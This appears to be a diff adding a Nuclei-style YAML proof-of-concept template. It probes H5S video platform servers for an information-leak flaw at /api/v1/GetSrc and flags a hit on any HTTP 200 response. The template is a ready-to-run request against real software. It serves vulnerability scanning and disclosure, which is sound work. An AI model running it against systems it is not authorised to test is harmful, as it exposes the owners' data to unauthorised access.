@@ -1,0 +1,31 @@
+id: poc-oe76pw9ptbtaisml
+info:
+  name: H5S视频平台GetSrc存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oe76pw9ptbtaisml'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oe76pw9ptbtaisml
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /api/v1/GetSrc HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
